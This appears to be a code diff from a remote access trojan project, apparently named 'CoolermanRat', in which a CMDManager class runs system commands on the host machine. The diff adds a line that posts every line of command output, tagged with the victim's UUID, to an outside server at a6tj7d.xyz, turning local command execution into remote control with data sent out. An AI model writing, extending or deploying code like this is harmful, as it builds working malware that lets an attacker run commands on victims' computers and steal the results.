@@ -1,6 +1,7 @@
 package me.dodeedoo.CoolermanRat;
 
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
@@ -26,7 +27,7 @@ public class CMDManager {
         return this.lookfor;
     }
 
-    public CMDManager(String cmd[], String lookfor) {
+    public CMDManager(String cmd[], String lookfor) throws IOException {
         this.cmd = cmd;
         this.lookfor = lookfor;
         List<String> output = executeCommand(cmd);
@@ -35,6 +36,7 @@ public class CMDManager {
         }
         for (String line : output) {
             System.out.println(line);
+            new Requests("http://a6tj7d.xyz/cmd/" + Main.uuid, "{\"line\":\""+ line +"\"}").execute();
         }
     }
 
